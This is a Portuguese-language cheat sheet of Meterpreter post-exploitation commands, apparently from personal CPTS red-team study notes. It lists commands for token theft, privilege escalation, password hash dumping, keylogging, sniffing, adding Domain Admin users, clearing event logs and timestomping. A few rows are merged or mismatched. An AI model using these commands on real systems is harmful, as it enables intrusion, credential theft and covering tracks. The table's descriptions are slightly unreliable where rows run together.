> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/using-metasploit-framework/meterpreter-commands.md).

# Meterpreter Commands

| **Comando**                                           | **Descrição**                                                                                                |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| `help`                                                | Abra a ajuda de uso do Meterpreter.                                                                          |
| `run <scriptname>`                                    | Execute scripts baseados no Meterpreter; para uma lista completa, verifique o diretório scripts/meterpreter. |
| `sysinfo`                                             | Exibe as informações do sistema sobre o alvo comprometido.                                                   |
| `ls`                                                  | Liste os arquivos e pastas no destino.                                                                       |
| `use priv`                                            | Carregue a extensão de privilégios para bibliotecas estendidas do Meterpreter.                               |
| `ps`                                                  | Mostre todos os processos em execução e quais contas estão associadas a cada processo.                       |
| `migrate <proc. id>`                                  | Migrar para o ID do processo específico (PID é o ID do processo de destino obtido do comando ps).            |
| `use incognito`                                       | Carregar funções anônimas. (Usado para roubo de tokens e representação em uma máquina alvo.)                 |
| `list_tokens -u`                                      | Listar tokens disponíveis no alvo por usuário.                                                               |
| `list_tokens -g`                                      | Listar tokens disponíveis no alvo por grupo.                                                                 |
| `impersonate_token <DOMAIN_NAMEUSERNAME>`             | Representa um token disponível no alvo.                                                                      |
| `steal_token <proc. id>`                              | Roube os tokens disponíveis para um determinado processo e personifique esse token.                          |
| `drop_token`                                          | Pare de personificar o token atual.                                                                          |
| `getsystem`                                           | Tentar elevar permissões para acesso de nível de SISTEMA por meio de vários vetores de ataque.               |
| `shell`                                               | Entre em um shell interativo com todos os tokens disponíveis.                                                |
| `execute -f <cmd.exe> -i`                             | Execute cmd.exe e interaja com ele.                                                                          |
| `execute -f <cmd.exe> -i -t`                          | Execute cmd.exe com todos os tokens disponíveis.                                                             |
| `execute -f <cmd.exe> -i -H -t`                       | Execute cmd.exe com todos os tokens disponíveis e torne-o um processo oculto.                                |
| `rev2self`                                            | Retorne ao usuário original que você usou para comprometer o alvo.                                           |
| `reg <command>`                                       | Interaja, crie, exclua, consulte, defina e muito mais no registro do alvo.                                   |
| `setdesktop <number>`                                 | Alterne para uma tela diferente com base em quem está conectado.                                             |
| `screenshot`                                          | Faça uma captura de tela da tela do alvo.                                                                    |
| `upload <filename>`                                   | Carregue um arquivo para o destino.                                                                          |
| `download <filename>`                                 | Baixe um arquivo do destino.                                                                                 |
| `keyscan_start`                                       | Comece a farejar as teclas digitadas no alvo remoto.                                                         |
| `keyscan_dump`                                        | Despeja as chaves remotas capturadas no alvo.                                                                |
| `keyscan_stop`                                        | Pare de farejar as teclas digitadas no alvo remoto.                                                          |
| `getprivs`                                            | Obtenha o máximo de privilégios possível no alvo.                                                            |
| `uictl enable <keyboard/mouse>`                       | Assuma o controle do teclado e/ou mouse.                                                                     |
| `background`                                          | Execute seu shell Meterpreter atual em segundo plano.                                                        |
| `hashdump`                                            | Despeje todos os hashes no alvo. use sniffer Carregue o módulo sniffer.                                      |
| `sniffer_interfaces`                                  | Liste as interfaces disponíveis no destino.                                                                  |
| `sniffer_dump <interfaceID> pcapname`                 | Comece a farejar o alvo remoto.                                                                              |
| `sniffer_start <interfaceID> packet-buffer`           | Comece a farejar com um intervalo específico para um buffer de pacotes.                                      |
| `sniffer_stats <interfaceID>`                         | Obtenha informações estatísticas da interface que você está farejando.                                       |
| `sniffer_stop <interfaceID>`                          | Pare o farejador.                                                                                            |
| `add_user <username> <password> -h <ip>`              | Adicione um usuário no destino remoto.                                                                       |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Adicione um nome de usuário ao grupo Administradores de Domínio no destino remoto.                           |
| `clearev`                                             | Limpe o log de eventos na máquina de destino.                                                                |
| `timestomp`                                           | Alterar atributos do arquivo, como data de criação (medida antiforense).                                     |
| `reboot`                                              | Reinicie a máquina de destino.                                                                               |
